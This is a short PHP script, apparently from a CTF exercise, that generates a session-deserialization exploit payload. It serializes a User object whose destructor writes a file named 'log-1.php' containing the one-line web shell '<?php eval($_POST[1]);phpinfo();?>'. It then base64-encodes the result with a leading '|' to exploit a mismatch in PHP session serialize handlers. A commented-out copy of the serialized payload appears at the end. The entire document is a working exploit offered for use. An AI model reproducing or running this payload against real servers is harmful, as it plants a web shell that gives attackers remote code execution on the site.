<?php
ini_set('session.serialize_handler', 'php');
class User{
    public $username;
    public $password;
    public $status;
    function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }
    function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
}

$a = new User("1.php", '<?php eval($_POST[1]);phpinfo();?>');
echo base64_encode("|".serialize($a));
/*$b= '|O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:34:"<?php eval($_POST[1]);phpinfo();?>";s:6:"status";N;}';*/
//echo unserialize($b);